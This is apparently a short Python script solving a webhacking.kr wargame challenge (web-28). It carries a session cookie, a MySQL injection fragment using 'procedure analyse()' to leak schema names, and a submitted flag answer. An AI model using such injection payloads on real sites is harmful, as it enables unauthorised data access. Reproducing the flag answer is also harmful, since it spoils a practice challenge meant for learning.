import requests

url = 'http://webhacking.kr/challenge/web/web-28/index.php'
cookies = {'PHPSESSID':'jkjivvneaac91tlk8t10ti22m4'}
data = '?val=1 procedure analyse()'
url = url
pay={'answer':'Chal12NGe_53_TabLE_zz'}
print requests.get(url, cookies=cookies, params=pay).text
